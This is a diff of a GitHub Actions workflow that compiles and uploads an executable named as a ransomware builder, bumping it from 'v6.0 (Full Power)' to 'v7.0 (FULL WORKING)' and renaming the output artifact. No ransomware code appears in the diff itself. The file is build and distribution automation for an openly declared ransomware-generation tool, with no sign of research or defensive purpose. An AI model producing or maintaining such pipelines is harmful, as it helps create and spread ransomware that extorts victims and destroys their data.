@@ -1,4 +1,4 @@
-name: Build Ransomware Builder v6.0 (Full Power)
+name: Build Ransomware Builder v7.0 (FULL WORKING)
 
 on:
   push:
@@ -13,7 +13,7 @@ jobs:
     - name: Checkout
       uses: actions/checkout@v4
     
-    # ========== СБОРКА ШАБЛОНА (БЕЗ OPENSSL) ==========
+    # ========== СБОРКА ШАБЛОНА ==========
     - name: Setup MSVC
       uses: ilammy/msvc-dev-cmd@v1
     
@@ -45,7 +45,7 @@ jobs:
         if (Test-Path "bin\Any CPU\Release\net48\builder.exe") {
             Write-Host "=== Build SUCCESS ==="
             Get-ChildItem "bin\Any CPU\Release\net48\builder.exe" | Format-Table -AutoSize
-            Copy-Item "bin\Any CPU\Release\net48\builder.exe" "RansomwareBuilder_v6_Full.exe"
+            Copy-Item "bin\Any CPU\Release\net48\builder.exe" "RansomwareBuilder_v7_Full.exe"
         } else {
             Write-Host "=== Build FAILED ==="
             exit 1
@@ -54,5 +54,5 @@ jobs:
     - name: Upload Builder EXE
       uses: actions/upload-artifact@v4
       with:
-        name: RansomwareBuilder_v6_Full
-        path: RansomwareBuilder_v6_Full.exe
+        name: RansomwareBuilder_v7_Full
+        path: RansomwareBuilder_v7_Full.exe
